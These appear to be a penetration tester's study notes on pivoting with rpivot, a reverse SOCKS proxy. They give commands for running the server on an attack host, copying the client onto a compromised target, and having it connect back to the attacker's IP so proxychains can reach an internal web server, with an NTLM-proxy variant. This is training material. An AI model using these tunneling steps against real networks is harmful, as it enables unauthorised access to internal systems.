- [Rpivot](https://github.com/klsecservices/rpivot) is **a reverse SOCKS proxy tool written in Python for SOCKS tunneling.**
- Rpivot **binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.**

![[Pasted image 20250729070009.png]]

# Using Rpivot
---
## Cloning:
- `git clone https://github.com/klsecservices/rpivot.git`
## Running server.py from the Attack Host:
- `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`
- Before running **`client.py` we will need to transfer rpivot to the target**. We can do this using this SCP command:

## Transferring rpivot to the Target:
- `scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/`
## Running client.py from Pivot Target:
- `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`
# Confirming Connection is Established:
- `New connection from host 10.129.202.64, source port 35226`

- We **==will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host==**, which was initially started by the Python server.
- Finally, **we should be able to access the webserver on our server-side**, which is hosted on the internal network of 172.16.5.0/23 at 172.16.5.135:80 using proxychains and Firefox.

# Connecting to a Web Server using HTTP-Proxy & NTLM Auth
---
- Some organizations have **[HTTP-proxy with NTLM authentication](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configured with the Domain Controller.** 
- In such cases, **we can provide an additional NTLM authentication option to rpivot to authenticate via the NTLM proxy** by providing a username and password. In these cases, we could use rpivot's client.py in the following way:
	- `python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>`